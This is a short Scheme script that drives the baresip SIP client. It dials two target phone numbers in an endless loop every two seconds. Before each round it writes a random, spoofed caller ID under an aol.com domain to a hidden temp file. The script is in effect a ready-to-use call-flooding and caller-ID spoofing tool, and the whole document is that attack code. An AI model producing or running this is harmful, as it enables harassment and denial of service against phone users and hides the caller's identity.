(use posix s)
(define targets `("19005551212"
                  "17005551212"))
(define zz 2)
(process-run "killall" `("-9" "baresip"))
(sleep 10)
(define-values
  (inp outp pid)
  (process "baresip"))
(define outgoing-domain "@aol.com")

(let ((c 1))
  (define (y)
    (let ((cfg
           (file-open
            "/tmp/.cid_baresip"
            (+ open/wronly open/creat))))
         (file-write cfg (sprintf "sip:1~A~A~A~A"
                                  (+ 200 (random 799))
                                  (+ 200 (random 799))
                                  (+ 1000 (random 8999))
                                  outgoing-domain))
         (file-close cfg))
    (print "Call # " c)
    (for-each (lambda(t)
                (write-line
                 (sprintf "/dial ~A" t) outp))
              targets)
    (sleep zz)
    (set! c (add1 c))
    (y))
(y))


